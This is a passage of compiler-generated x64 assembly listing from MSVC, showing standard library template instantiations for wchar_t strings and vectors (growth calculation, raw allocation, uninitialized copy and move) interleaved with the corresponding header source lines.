;	COMDAT ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z
_TEXT	SEGMENT
this$ = 8
_Requested$ = 16
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth, COMDAT

; 4776 :         return _Calculate_growth(_Requested, _Mypair._Myval2._Myres, max_size());

	mov	rax, QWORD PTR [rcx+24]

; 4763 :         const size_type _Masked = _Requested | _Alloc_mask;

	or	rdx, 7
	mov	r9, 9223372036854775806			; 7ffffffffffffffeH
	cmp	rdx, r9

; 4764 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

	jbe	SHORT $LN5@Calculate_
$LN12@Calculate_:

; 4777 :     }

	mov	rax, r9
	ret	0
$LN5@Calculate_:

; 4768 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows

	mov	r8, rax
	mov	rcx, r9
	shr	r8, 1
	sub	rcx, r8
	cmp	rax, rcx
	ja	SHORT $LN12@Calculate_

; 4769 :             return _Max;
; 4770 :         }
; 4771 : 
; 4772 :         return (_STD max)(_Masked, _Old + _Old / 2);

	lea	rcx, QWORD PTR [r8+rax]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 74   :     return _Left < _Right ? _Right : _Left;

	cmp	rdx, rcx
	cmovb	rdx, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4776 :         return _Calculate_growth(_Requested, _Mypair._Myval2._Myres, max_size());

	mov	rax, rdx

; 4777 :     }

	ret	0
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEBAAEBV?$allocator@_W@2@XZ PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Getal, COMDAT

; 2189 :         return _Mypair._Get_first();

	mov	rax, rcx

; 2190 :     }

	ret	0
?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEBAAEBV?$allocator@_W@2@XZ ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?_Buy_raw@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z
_TEXT	SEGMENT
this$ = 48
_Newcapacity$ = 56
?_Buy_raw@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Buy_raw, COMDAT

; 1983 :     _CONSTEXPR20 void _Buy_raw(size_type _Newcapacity) {

$LN45:
	mov	QWORD PTR [rsp+8], rbx
	push	rdi
	sub	rsp, 32					; 00000020H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 84   :         if (_Count > _Max_possible) {

	mov	rax, 9223372036854775807		; 7fffffffffffffffH
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 1983 :     _CONSTEXPR20 void _Buy_raw(size_type _Newcapacity) {

	mov	rdi, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 84   :         if (_Count > _Max_possible) {

	cmp	rdx, rax
	ja	SHORT $LN36@Buy_raw

; 85   :             _Throw_bad_array_new_length(); // multiply overflow
; 86   :         }
; 87   :     }
; 88   : 
; 89   :     return _Count * _Ty_size;

	lea	rbx, QWORD PTR [rdx+rdx]

; 196  :     if (_Bytes == 0) {

	test	rbx, rbx
	jne	SHORT $LN12@Buy_raw

; 197  :         return nullptr;

	xor	eax, eax
	jmp	SHORT $LN11@Buy_raw
$LN12@Buy_raw:

; 198  :     }
; 199  : 
; 200  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 201  :     if (_STD is_constant_evaluated()) {
; 202  :         return _Traits::_Allocate(_Bytes);
; 203  :     }
; 204  : #endif // _HAS_CXX20
; 205  : 
; 206  : #ifdef __cpp_aligned_new
; 207  :     if constexpr (_Align > __STDCPP_DEFAULT_NEW_ALIGNMENT__) {
; 208  :         size_t _Passed_align = _Align;
; 209  : #if defined(_M_IX86) || defined(_M_X64)
; 210  :         if (_Bytes >= _Big_allocation_threshold) {
; 211  :             // boost the alignment of big allocations to help autovectorization
; 212  :             _Passed_align = (_STD max)(_Align, _Big_allocation_alignment);
; 213  :         }
; 214  : #endif // defined(_M_IX86) || defined(_M_X64)
; 215  :         return _Traits::_Allocate_aligned(_Bytes, _Passed_align);
; 216  :     } else
; 217  : #endif // defined(__cpp_aligned_new)
; 218  :     {
; 219  : #if defined(_M_IX86) || defined(_M_X64)
; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rbx, 4096				; 00001000H
	jb	SHORT $LN14@Buy_raw

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rcx, QWORD PTR [rbx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rcx, rbx
	jbe	SHORT $LN36@Buy_raw

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new
	mov	rcx, rax

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	SHORT $LN24@Buy_raw

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	add	rax, 39					; 00000027H
	and	rax, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rax-8], rcx

; 222  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

	jmp	SHORT $LN11@Buy_raw
$LN14@Buy_raw:

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rbx
	call	??2@YAPEAX_K@Z				; operator new
$LN11@Buy_raw:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 1994 :         _Myfirst              = _Newvec;

	mov	QWORD PTR [rdi], rax

; 1995 :         _Mylast               = _Newvec;

	mov	QWORD PTR [rdi+8], rax

; 1996 :         _Myend                = _Newvec + _Newcapacity;

	add	rax, rbx

; 1997 :     }

	mov	rbx, QWORD PTR [rsp+48]
	mov	QWORD PTR [rdi+16], rax
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
$LN36@Buy_raw:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN24@Buy_raw:

; 156  :     }
; 157  : 
; 158  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));
; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN43@Buy_raw:
?_Buy_raw@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Buy_raw
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?capacity@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ
_TEXT	SEGMENT
this$ = 8
?capacity@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::capacity, COMDAT

; 1882 :         auto& _My_data = _Mypair._Myval2;
; 1883 :         return static_cast<size_type>(_My_data._Myend - _My_data._Myfirst);

	mov	rax, QWORD PTR [rcx+16]
	sub	rax, QWORD PTR [rcx]
	sar	rax, 1

; 1884 :     }

	ret	0
?capacity@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::capacity
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1508 :         return *this;

	mov	rax, rcx

; 1509 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@AEBV?$allocator@_W@std@@@std@@YAAEBV?$allocator@_W@0@AEBV10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEBV?$allocator@_W@std@@@std@@YAAEBV?$allocator@_W@0@AEBV10@@Z PROC ; std::forward<std::allocator<wchar_t> const &>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@AEBV?$allocator@_W@std@@@std@@YAAEBV?$allocator@_W@0@AEBV10@@Z ENDP ; std::forward<std::allocator<wchar_t> const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Copy_n_unchecked4@PEAD_KPEA_W@std@@YAPEA_WPEAD_KPEA_W@Z
_TEXT	SEGMENT
_First$ = 8
_Count$ = 16
_Dest$ = 24
??$_Copy_n_unchecked4@PEAD_KPEA_W@std@@YAPEA_WPEAD_KPEA_W@Z PROC ; std::_Copy_n_unchecked4<char *,unsigned __int64,wchar_t *>, COMDAT

; 4656 :     // copy _First + [0, _Count) to _Dest + [0, _Count), returning _Dest + _Count
; 4657 :     // note: has callers outside the copy family
; 4658 : #if _HAS_CXX20
; 4659 :     _STL_INTERNAL_STATIC_ASSERT(_Integer_like<_SizeTy>);
; 4660 : #endif // _HAS_CXX20
; 4661 : 
; 4662 :     if constexpr (_Iter_copy_cat<_InIt, _OutIt>::_Bitcopy_assignable) {
; 4663 : #if _HAS_CXX20
; 4664 :         if (!_STD is_constant_evaluated())
; 4665 : #endif // _HAS_CXX20
; 4666 :         {
; 4667 :             return _Copy_memmove_n(_First, static_cast<size_t>(_Count), _Dest);
; 4668 :         }
; 4669 :     }
; 4670 : 
; 4671 :     for (; _Count != 0; ++_Dest, (void) ++_First, --_Count) {

	test	rdx, rdx
	je	SHORT $LN10@Copy_n_unc
	npad	11
$LL4@Copy_n_unc:

; 4672 :         *_Dest = *_First;

	movsx	eax, BYTE PTR [rcx]
	lea	rcx, QWORD PTR [rcx+1]
	mov	WORD PTR [r8], ax
	add	r8, 2
	sub	rdx, 1
	jne	SHORT $LL4@Copy_n_unc
$LN10@Copy_n_unc:

; 4673 :     }
; 4674 : 
; 4675 :     return _Dest;
; 4676 : }

	mov	rax, r8
	ret	0
??$_Copy_n_unchecked4@PEAD_KPEA_W@std@@YAPEA_WPEAD_KPEA_W@Z ENDP ; std::_Copy_n_unchecked4<char *,unsigned __int64,wchar_t *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@PEA_W@std@@YA$$QEAPEA_WAEAPEA_W@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@PEA_W@std@@YA$$QEAPEA_WAEAPEA_W@Z PROC	; std::forward<wchar_t *>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@PEA_W@std@@YA$$QEAPEA_WAEAPEA_W@Z ENDP	; std::forward<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Unwrap_iter@PEA_WPEA_W@ranges@std@@YA?A_T$$QEAPEA_W@Z
_TEXT	SEGMENT
_It$ = 8
??$_Unwrap_iter@PEA_WPEA_W@ranges@std@@YA?A_T$$QEAPEA_W@Z PROC ; std::ranges::_Unwrap_iter<wchar_t *,wchar_t *>, COMDAT

; 2640 :         _STL_INTERNAL_STATIC_ASSERT(sentinel_for<remove_cvref_t<_Sent>, remove_cvref_t<_Iter>>);
; 2641 :         if constexpr (is_pointer_v<remove_cvref_t<_Iter>>) {
; 2642 :             return _It + 0;

	mov	rax, QWORD PTR [rcx]

; 2643 :         } else if constexpr (_Unwrappable_sentinel_for<_Sent, _Iter>) {
; 2644 :             return static_cast<_Iter&&>(_It)._Unwrapped();
; 2645 :         } else {
; 2646 :             return static_cast<_Iter&&>(_It);
; 2647 :         }
; 2648 :     }

	ret	0
??$_Unwrap_iter@PEA_WPEA_W@ranges@std@@YA?A_T$$QEAPEA_W@Z ENDP ; std::ranges::_Unwrap_iter<wchar_t *,wchar_t *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Unwrap_sent@PEA_WPEA_W@ranges@std@@YA?A_T$$QEAPEA_W@Z
_TEXT	SEGMENT
_Se$ = 8
??$_Unwrap_sent@PEA_WPEA_W@ranges@std@@YA?A_T$$QEAPEA_W@Z PROC ; std::ranges::_Unwrap_sent<wchar_t *,wchar_t *>, COMDAT

; 2653 :         _STL_INTERNAL_STATIC_ASSERT(sentinel_for<remove_cvref_t<_Sent>, remove_cvref_t<_Iter>>);
; 2654 :         if constexpr (is_pointer_v<remove_cvref_t<_Sent>>) {
; 2655 :             return _Se + 0;

	mov	rax, QWORD PTR [rcx]

; 2656 :         } else if constexpr (_Unwrappable_sentinel_for<_Sent, _Iter>) {
; 2657 :             return static_cast<_Sent&&>(_Se)._Unwrapped();
; 2658 :         } else {
; 2659 :             return static_cast<_Sent&&>(_Se);
; 2660 :         }
; 2661 :     }

	ret	0
??$_Unwrap_sent@PEA_WPEA_W@ranges@std@@YA?A_T$$QEAPEA_W@Z ENDP ; std::ranges::_Unwrap_sent<wchar_t *,wchar_t *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Uninitialized_copy@PEA_WPEA_WV?$allocator@_W@std@@@std@@YAPEA_WPEA_W00AEAV?$allocator@_W@0@@Z
_TEXT	SEGMENT
_First$ = 48
_Last$ = 56
_Dest$ = 64
_Al$dead$ = 72
??$_Uninitialized_copy@PEA_WPEA_WV?$allocator@_W@std@@@std@@YAPEA_WPEA_W00AEAV?$allocator@_W@0@@Z PROC ; std::_Uninitialized_copy<wchar_t *,wchar_t *,std::allocator<wchar_t> >, COMDAT

; 1797 :     _InIt _First, _Se _Last, _Alloc_ptr_t<_Alloc> _Dest, _Alloc& _Al) {

$LN24:
	mov	QWORD PTR [rsp+32], rbx
	push	rdi
	sub	rsp, 32					; 00000020H
	mov	rbx, rdx
	mov	rdi, r8
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4620 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

	sub	rbx, rcx

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	rdx, rcx
	mov	r8, rbx
	mov	rcx, rdi
	call	memmove
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1822 :                 _Dest += _ULast - _UFirst;

	sar	rbx, 1
	lea	rax, QWORD PTR [rdi+rbx*2]

; 1823 :             } else {
; 1824 :                 const auto _Count = static_cast<size_t>(_ULast - _UFirst);
; 1825 :                 _STD _Copy_memmove_n(_STD _To_address(_UFirst), _Count, _STD _Unfancy(_Dest));
; 1826 :                 _Dest += _Count;
; 1827 :             }
; 1828 :             return _Dest;
; 1829 :         }
; 1830 :     }
; 1831 : 
; 1832 :     _Uninitialized_backout_al<_Alloc> _Backout{_Dest, _Al};
; 1833 :     for (; _UFirst != _ULast; ++_UFirst) {
; 1834 :         _Backout._Emplace_back(*_UFirst);
; 1835 :     }
; 1836 : 
; 1837 :     return _Backout._Release();
; 1838 : }

	mov	rbx, QWORD PTR [rsp+72]
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
??$_Uninitialized_copy@PEA_WPEA_WV?$allocator@_W@std@@@std@@YAPEA_WPEA_W00AEAV?$allocator@_W@0@@Z ENDP ; std::_Uninitialized_copy<wchar_t *,wchar_t *,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_To_address@PEA_W@std@@YA?A_PAEBQEA_W@Z
_TEXT	SEGMENT
_Val$ = 8
??$_To_address@PEA_W@std@@YA?A_PAEBQEA_W@Z PROC		; std::_To_address<wchar_t *>, COMDAT

; 4482 :     _STL_INTERNAL_STATIC_ASSERT(contiguous_iterator<_Iter>);
; 4483 :     return _STD to_address(_Val);

	mov	rax, QWORD PTR [rcx]

; 4484 : }

	ret	0
??$_To_address@PEA_W@std@@YA?A_PAEBQEA_W@Z ENDP		; std::_To_address<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Construct_in_place@_W_W@std@@YAXAEA_W$$QEA_W@Z
_TEXT	SEGMENT
_Obj$ = 8
<_Args_0>$ = 16
??$_Construct_in_place@_W_W@std@@YAXAEA_W$$QEA_W@Z PROC	; std::_Construct_in_place<wchar_t,wchar_t>, COMDAT

; 382  : #if _HAS_CXX20
; 383  :     if (_STD is_constant_evaluated()) {
; 384  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 385  :     } else
; 386  : #endif // _HAS_CXX20
; 387  :     {
; 388  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);
; 389  :     }
; 390  : }

	movzx	eax, WORD PTR [rdx]
	mov	WORD PTR [rcx], ax
	ret	0
??$_Construct_in_place@_W_W@std@@YAXAEA_W$$QEA_W@Z ENDP	; std::_Construct_in_place<wchar_t,wchar_t>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z
_TEXT	SEGMENT
_Al$dead$ = 48
_Count$ = 56
??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z PROC ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >, COMDAT

; 2177 :     _Alloc& _Al, _CRT_GUARDOVERFLOW typename allocator_traits<_Alloc>::size_type& _Count) {

$LN37:
	sub	rsp, 40					; 00000028H

; 2178 : #if _HAS_CXX23
; 2179 :     if constexpr (_Should_allocate_at_least<_Alloc>) {
; 2180 :         auto [_Ptr, _Allocated] = _Al.allocate_at_least(_Count);
; 2181 :         _Count                  = _Allocated;
; 2182 :         return _Ptr;
; 2183 :     } else
; 2184 : #endif // _HAS_CXX23
; 2185 :     {
; 2186 :         return _Al.allocate(_Count);

	mov	rcx, QWORD PTR [rdx]

; 84   :         if (_Count > _Max_possible) {

	mov	rax, 9223372036854775807		; 7fffffffffffffffH
	cmp	rcx, rax
	ja	SHORT $LN33@Allocate_a

; 85   :             _Throw_bad_array_new_length(); // multiply overflow
; 86   :         }
; 87   :     }
; 88   : 
; 89   :     return _Count * _Ty_size;

	add	rcx, rcx

; 196  :     if (_Bytes == 0) {

	jne	SHORT $LN10@Allocate_a

; 197  :         return nullptr;

	xor	eax, eax

; 2187 :     }
; 2188 : }

	add	rsp, 40					; 00000028H
	ret	0
$LN10@Allocate_a:

; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rcx, 4096				; 00001000H
	jb	SHORT $LN12@Allocate_a

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rax, QWORD PTR [rcx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rax, rcx
	jbe	SHORT $LN33@Allocate_a

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rax
	call	??2@YAPEAX_K@Z				; operator new
	mov	rcx, rax

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	SHORT $LN22@Allocate_a

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	add	rax, 39					; 00000027H
	and	rax, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rax-8], rcx

; 2187 :     }
; 2188 : }

	add	rsp, 40					; 00000028H
	ret	0
$LN12@Allocate_a:
	add	rsp, 40					; 00000028H

; 101  :         return ::operator new(_Bytes);

	jmp	??2@YAPEAX_K@Z				; operator new
$LN33@Allocate_a:

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN22@Allocate_a:

; 156  :     }
; 157  : 
; 158  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));
; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN35@Allocate_a:
??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ENDP ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$construct@_W_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_W$$QEA_W@Z
_TEXT	SEGMENT
__formal$dead$ = 8
_Ptr$ = 16
<_Args_0>$ = 24
??$construct@_W_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_W$$QEA_W@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::construct<wchar_t,wchar_t>, COMDAT
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 375  :     _MSVC_CONSTEXPR return ::new (static_cast<void*>(_Location)) _Ty(_STD forward<_Types>(_Args)...);

	movzx	eax, WORD PTR [r8]
	mov	WORD PTR [rdx], ax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 702  :     }

	ret	0
??$construct@_W_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_W$$QEA_W@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::construct<wchar_t,wchar_t>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Get_unwrapped@AEBQEA_W@std@@YA?A_TAEBQEA_W@Z
_TEXT	SEGMENT
_It$ = 8
??$_Get_unwrapped@AEBQEA_W@std@@YA?A_TAEBQEA_W@Z PROC	; std::_Get_unwrapped<wchar_t * const &>, COMDAT

; 1305 :     // unwrap an iterator previously subjected to _Adl_verify_range or otherwise validated
; 1306 :     if constexpr (is_pointer_v<decay_t<_Iter>>) { // special-case pointers and arrays
; 1307 :         return _It + 0;

	mov	rax, QWORD PTR [rcx]

; 1308 :     } else if constexpr (_Unwrappable_v<_Iter>) {
; 1309 :         return static_cast<_Iter&&>(_It)._Unwrapped();
; 1310 :     } else {
; 1311 :         return static_cast<_Iter&&>(_It);
; 1312 :     }
; 1313 : }

	ret	0
??$_Get_unwrapped@AEBQEA_W@std@@YA?A_TAEBQEA_W@Z ENDP	; std::_Get_unwrapped<wchar_t * const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z
_TEXT	SEGMENT
_First$ = 48
_Last$ = 56
_Dest$ = 64
_Al$dead$ = 72
??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z PROC ; std::_Uninitialized_move<wchar_t *,std::allocator<wchar_t> >, COMDAT

; 1905 :     const _InIt _First, const _InIt _Last, _Alloc_ptr_t<_Alloc> _Dest, _Alloc& _Al) {

$LN24:
	mov	QWORD PTR [rsp+32], rbx
	push	rdi
	sub	rsp, 32					; 00000020H
	mov	rbx, rdx
	mov	rdi, r8
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4620 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

	sub	rbx, rcx

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	rdx, rcx
	mov	r8, rbx
	mov	rcx, rdi
	call	memmove
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1918 :             return _Dest + (_ULast - _UFirst);

	sar	rbx, 1
	lea	rax, QWORD PTR [rdi+rbx*2]

; 1919 :         }
; 1920 :     }
; 1921 : 
; 1922 :     _Uninitialized_backout_al<_Alloc> _Backout{_Dest, _Al};
; 1923 :     for (; _UFirst != _ULast; ++_UFirst) {
; 1924 :         _Backout._Emplace_back(_STD move(*_UFirst));
; 1925 :     }
; 1926 : 
; 1927 :     return _Backout._Release();
; 1928 : }

	mov	rbx, QWORD PTR [rsp+72]
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z ENDP ; std::_Uninitialized_move<wchar_t *,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$construct_at@_W$$V$0A@@std@@YAPEA_WQEA_W@Z
_TEXT	SEGMENT
_Location$ = 8
